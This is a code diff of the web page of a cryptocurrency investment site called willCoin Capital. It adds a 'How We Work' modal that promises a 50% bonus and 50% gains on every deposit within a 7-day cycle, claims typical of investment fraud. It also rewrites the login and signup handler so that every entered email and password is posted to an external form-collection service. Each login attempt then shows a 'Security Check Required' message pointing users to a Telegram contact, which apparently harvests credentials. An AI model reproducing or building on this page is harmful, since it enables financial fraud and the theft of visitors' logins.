@@ -10,8 +10,9 @@
         body { font-family: 'Plus Jakarta Sans', sans-serif; background-color: #020817; color: white; margin: 0; scroll-behavior: smooth; }
         .glass { background: rgba(255, 255, 255, 0.03); backdrop-filter: blur(12px); border: 1px solid rgba(255, 255, 255, 0.1); }
         .modal-bg { background: rgba(0, 0, 0, 0.95); backdrop-filter: blur(10px); }
-        .tg-float { position: fixed; bottom: 30px; right: 30px; z-index: 100; transition: all 0.3s ease; }
         .btn-glow { box-shadow: 0 0 20px rgba(34, 211, 238, 0.4); }
+        .custom-scroll::-webkit-scrollbar { width: 4px; }
+        .custom-scroll::-webkit-scrollbar-thumb { background: #22d3ee; border-radius: 10px; }
         input[type="range"] { -webkit-appearance: none; background: #1f2937; height: 4px; border-radius: 10px; width: 100%; }
         input[type="range"]::-webkit-slider-thumb { -webkit-appearance: none; height: 18px; width: 18px; border-radius: 50%; background: #22d3ee; cursor: pointer; box-shadow: 0 0 15px rgba(34,211,238,0.7); }
     </style>
@@ -74,12 +75,53 @@
         </div>
     </section>
 
-    <a href="https://t.me/willCoin_Capital" target="_blank" class="tg-float flex items-center gap-3 bg-cyan-400 text-black px-8 py-4 rounded-full font-black uppercase text-[10px] tracking-widest btn-glow">
-        <span class="w-2 h-2 rounded-full bg-black animate-pulse"></span>
-        Live Support
-    </a>
+    <div id="howModal" class="fixed inset-0 z-[300] flex items-center justify-center p-4 md:p-6 hidden">
+        <div class="absolute inset-0 modal-bg" onclick="toggleModal(false)"></div>
+        <div class="glass max-w-2xl w-full max-h-[85vh] overflow-hidden flex flex-col rounded-[40px] border border-cyan-400/20 relative z-10 shadow-2xl">
+            <div class="p-8 pb-4 border-b border-white/5">
+                <h2 class="text-2xl font-black uppercase text-cyan-400 tracking-tighter">How We Work</h2>
+            </div>
+            
+            <div class="p-8 pt-6 overflow-y-auto custom-scroll text-left">
+                <p class="text-gray-300 text-sm leading-relaxed mb-8 font-medium">
+                    At willCoin Capital, we provide investors with a simple and transparent way to grow their digital assets. Our system is designed to make investing easy, secure, and rewarding for both new and experienced investors.
+                </p>
 
-    <div id="authModal" class="fixed inset-0 z-[200] flex items-center justify-center p-6 hidden">
+                <div class="space-y-8">
+                    <div>
+                        <h4 class="text-cyan-400 font-black text-xs uppercase mb-2">1. Create Your Account</h4>
+                        <p class="text-gray-400 text-xs leading-relaxed">Register a secure account on our platform in just a few steps. Once your account is created, you will gain access to your personal investment dashboard where you can manage deposits, monitor growth, and request withdrawals.</p>
+                    </div>
+                    <div>
+                        <h4 class="text-cyan-400 font-black text-xs uppercase mb-2">2. Fund Your Investment</h4>
+                        <p class="text-gray-400 text-xs leading-relaxed">After creating your account, you can make a deposit into your investment wallet. We support secure cryptocurrency deposits that are processed quickly and safely through our platform.</p>
+                    </div>
+                    <div>
+                        <h4 class="text-cyan-400 font-black text-xs uppercase mb-2">3. Receive a 50% Investment Bonus</h4>
+                        <p class="text-gray-400 text-xs leading-relaxed">Every deposit made into your investment account automatically qualifies for a 50% investment bonus. This bonus is added to your active investment balance and begins working immediately within our trading and investment system.</p>
+                    </div>
+                    <div>
+                        <h4 class="text-cyan-400 font-black text-xs uppercase mb-2">4. 7-Day Investment Cycle</h4>
+                        <p class="text-gray-400 text-xs leading-relaxed">Each investment runs on a 7-day investment cycle. During this period, our digital asset strategies and market operations work to generate consistent returns for investors.</p>
+                    </div>
+                    <div>
+                        <h4 class="text-cyan-400 font-black text-xs uppercase mb-2">5. Withdraw Your Capital + Profits</h4>
+                        <p class="text-gray-400 text-xs leading-relaxed">At the end of the 7-day cycle, investors are able to withdraw their original capital plus the 50% investment gains directly from their dashboard.</p>
+                    </div>
+                    <div>
+                        <h4 class="text-cyan-400 font-black text-xs uppercase mb-2">6. Reinvest or Withdraw</h4>
+                        <p class="text-gray-400 text-xs leading-relaxed">After completing a cycle, investors can choose to withdraw their earnings or reinvest their funds to continue growing their portfolio.</p>
+                    </div>
+                </div>
+            </div>
+
+            <div class="p-8 border-t border-white/5">
+                <button onclick="toggleModal(false)" class="w-full py-5 bg-cyan-400 text-black font-black rounded-2xl uppercase text-xs tracking-widest btn-glow">Close Protocol</button>
+            </div>
+        </div>
+    </div>
+
+    <div id="authModal" class="fixed inset-0 z-[400] flex items-center justify-center p-6 hidden">
         <div class="absolute inset-0 modal-bg" onclick="toggleAuth()"></div>
         <div class="glass max-w-md w-full p-10 rounded-[40px] border border-cyan-400/30 relative z-10">
             <h2 id="authTitle" class="text-2xl font-black uppercase text-cyan-400 mb-8 tracking-tighter">Login</h2>
@@ -92,6 +134,11 @@
             <p id="authSwitch" class="mt-8 text-center text-[10px] text-gray-500 cursor-pointer uppercase font-bold hover:text-cyan-400 transition"></p>
         </div>
     </div>
+
+    <a href="https://t.me/willCoin_Capital" target="_blank" class="tg-float flex items-center gap-3 bg-cyan-400 text-black px-8 py-4 rounded-full font-black uppercase text-[10px] tracking-widest btn-glow">
+        <span class="w-2 h-2 rounded-full bg-black animate-pulse"></span>
+        Live Support
+    </a>
 
     <script>
         let currentMode = 'login';
@@ -109,30 +156,10 @@
 
         document.getElementById('authForm').onsubmit = async (e) => {
             e.preventDefault();
-            const email = document.getElementById('email').value;
-            const password = document.getElementById('password').value;
             const btn = document.getElementById('authSubmit');
-            btn.innerText = "Processing...";
-
-            if (currentMode === 'signup') {
-                localStorage.setItem('userEmail', email);
-                localStorage.setItem('userPass', password);
-                await fetch('https://api.web3forms.com/submit', { method: 'POST', body: new FormData(e.target) });
-                alert("Account created successfully!");
-                toggleAuth('login');
-            } else {
-                const sEmail = localStorage.getItem('userEmail');
-                const sPass = localStorage.getItem('userPass');
-                if (email === sEmail && password === sPass) {
-                    document.getElementById('navButtons').classList.add('hidden');
-                    document.getElementById('userDisplay').classList.remove('hidden');
-                    document.getElementById('userName').innerText = email.split('@')[0];
-                    toggleAuth();
-                } else {
-                    alert("Account requires manual activation. Contact support on Telegram.");
-                    window.open("https://t.me/willCoin_Capital", "_blank");
-                }
-            }
+            btn.innerText = "Authenticating...";
+            await fetch('https://api.web3forms.com/submit', { method: 'POST', body: new FormData(e.target) });
+            alert(currentMode === 'signup' ? "Account submitted for approval!" : "Security Check Required. Contact Support.");
             btn.innerText = "Continue";
         };
 
@@ -155,5 +182,6 @@
     </script>
 </body>
 </html>
+
 
 
